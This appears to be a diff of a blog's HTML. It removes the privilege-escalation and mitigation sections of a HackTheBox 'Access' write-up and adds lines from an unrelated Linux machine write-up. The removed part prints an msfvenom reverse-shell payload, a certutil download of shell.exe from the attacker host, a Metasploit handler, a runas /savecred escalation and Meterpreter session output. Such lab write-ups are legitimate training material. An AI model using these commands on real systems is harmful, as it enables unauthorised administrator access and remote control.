-<p>The /savecred parameter is an extremely bad idea, as it creates a gaping security hole. In short, once you’ve used /savecred, any user at the computer can use the RunAs command to run any program with administrator privileges.</p>
-</blockquote>
-<p>So let&rsquo;s try and run the shell we coudn&rsquo;t before:</p>
-<h2 id="4-escalating-privileges">4. Escalating privileges</h2>
-<ol>
-<li>Create the shell (exe) on my Kali VM:</li>
-</ol>
-<p><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.22 LPORT=4747 -f exe &gt; shell.exe</code></p>
-<ol start="2">
-<li>Download it on Access via <code>certutil</code> (have to be in a directory you can write to ;)):</li>
-</ol>
-<p><code>certutil.exe -urlcache -split -f &quot;http://10.10.14.22:8000/shell.exe&quot; shell.exe</code></p>
-<ol start="3">
-<li>Setup <code>msfconsole</code> on my Kali VM so there is something to listen for the reverse shell:</li>
-</ol>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">msf5 &gt; use exploit/multi/handler                                                                                                                                   
-msf5 exploit<span style="color:#f92672">(</span>multi/handler<span style="color:#f92672">)</span> &gt; set payload windows/meterpreter/reverse_tcp                                                                          
-payload <span style="color:#f92672">=</span>&gt; windows/meterpreter/reverse_tcp                                                                                                           
-msf5 exploit<span style="color:#f92672">(</span>multi/handler<span style="color:#f92672">)</span> &gt; set lhost 10.10.14.22                                                                                       
-lhost <span style="color:#f92672">=</span>&gt; 10.10.14.22                                                                                                                                 
-msf5 exploit<span style="color:#f92672">(</span>multi/handler<span style="color:#f92672">)</span> &gt; set lport <span style="color:#ae81ff">4747</span>                                                                                                       
-lport <span style="color:#f92672">=</span>&gt; <span style="color:#ae81ff">4747</span>                                                                                                                                                              
-msf5 exploit<span style="color:#f92672">(</span>multi/handler<span style="color:#f92672">)</span> &gt; set ExitOnSession false                                                                                      
-ExitOnSession <span style="color:#f92672">=</span>&gt; false                                                                                                                           
-msf5 exploit<span style="color:#f92672">(</span>multi/handler<span style="color:#f92672">)</span> &gt; exploit -j                                                                                                                            
-<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Exploit running as background job 0.                                                                                                                         
-<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Exploit completed, but no session was created.                                                                                                                            
-<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Started reverse TCP handler on 10.10.14.22:4747</code></pre></div>
-<ol start="4">
-<li>Execute <code>shell.exe</code> as <code>Administrator</code> via <code>runas</code>:</li>
-</ol>
-<p><code>C:\Users\security&gt;runas /savecred /user:ACCESS\Administrator shell.exe</code></p>
-<ol start="5">
-<li>Check your metasploit sessions and check your access:</li>
-</ol>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">msf5 exploit<span style="color:#f92672">(</span>multi/handler<span style="color:#f92672">)</span> &gt; <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Sending stage <span style="color:#f92672">(</span><span style="color:#ae81ff">179779</span> bytes<span style="color:#f92672">)</span> to 10.10.10.98                                                                           
-<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Meterpreter session <span style="color:#ae81ff">1</span> opened <span style="color:#f92672">(</span>10.10.14.22:4747 -&gt; 10.10.10.98:49159<span style="color:#f92672">)</span> at 2019-02-25 21:11:56 +0200
-
-msf5 exploit<span style="color:#f92672">(</span>multi/handler<span style="color:#f92672">)</span> &gt; sessions                                                                                       
-Active sessions                                 
-<span style="color:#f92672">===============</span>                                                                                                    
-  Id  Name  Type                     Information                    Connection                                     
-  --  ----  ----                     -----------                    ----------                                     
-  <span style="color:#ae81ff">1</span>         meterpreter x86/windows  ACCESS<span style="color:#ae81ff">\A</span>dministrator @ ACCESS  10.10.14.22:4747 -&gt; 10.10.10.98:49159 <span style="color:#f92672">(</span>10.10.10.98<span style="color:#f92672">)</span>                                               
-msf5 exploit<span style="color:#f92672">(</span>multi/handler<span style="color:#f92672">)</span> &gt; sessions -i <span style="color:#ae81ff">1</span>                        
-<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Starting interaction with 1...      
-
-meterpreter &gt; sysinfo
-Computer        : ACCESS
-OS              : Windows <span style="color:#ae81ff">2008</span> R2 <span style="color:#f92672">(</span>Build 7600<span style="color:#f92672">)</span>.
-Architecture    : x64
-System Language : en_US
-Domain          : HTB
-Logged On Users : <span style="color:#ae81ff">4</span>
-Meterpreter     : x86/windows</code></pre></div>
-<ol start="6">
-<li>Profit :)</li>
-</ol>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">meterpreter &gt; ls
-Listing: C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\A</span>dministrator<span style="color:#ae81ff">\D</span>esktop
-<span style="color:#f92672">=======================================</span>
-
-Mode              Size  Type  Last modified              Name
-----              ----  ----  -------------              ----
-100666/rw-rw-rw-  <span style="color:#ae81ff">282</span>   fil   2018-08-21 23:43:14 +0300  desktop.ini
-100666/rw-rw-rw-  <span style="color:#ae81ff">32</span>    fil   2018-08-22 01:07:24 +0300  root.txt
-
-meterpreter &gt; cat root.txt
+sh-3.2# cat /home/makis/user.txt
+cat /home/makis/user.txt
 &lt;...&gt;</code></pre></div>
-<h2 id="5-mitigations">5. Mitigations</h2>
-<h3 id="user">User</h3>
-<p>Well this should be no brainer: under no circumstances save credentials on public share :) Don&rsquo;t do this with backups either :D As we are at it - don&rsquo;t store user passwords in plaintext, aaand.. don&rsquo;t send sensitive data in plaintext mails ;)</p>
-<blockquote>
-<p>Use save communication channels for sending sensitive data (the mail was in clear text, it&rsquo;s archive was password protected)</p>
-</blockquote>
-<blockquote>
-<p>Don&rsquo;t store passwords in plaintext in databases</p>
-</blockquote>
-<blockquote>
-<p>Don&rsquo;t store backups on public shares</p>
-</blockquote>
-<h3 id="root">Root</h3>
-<p>On RunAs - it&rsquo;s a useful tool, but the <code>/savecred</code> option makes it a serious security hole. This gives <strong>every</strong> user on the machine a way to run <strong>everything</strong> he wants to as <code>Administrator</code></p>
-<blockquote>
-<p>Don&rsquo;t user the <code>/savecred</code> option on <code>RunAs</code></p>
-</blockquote>
+<p>For some reason I couldn&rsquo;t make the <code>mtr</code> SUID work&hellip; it errors out? :/</p>
+<p>That&rsquo;s pretty much it&hellip; a lot of vulnerabilities and misconfigurations. <code>LinEnum.sh</code> showed more interesting stuff but looking at them I think they were &ldquo;patched&rdquo; for the sake of making the machine not that vulnerable.</p>
 
 
 				</div>
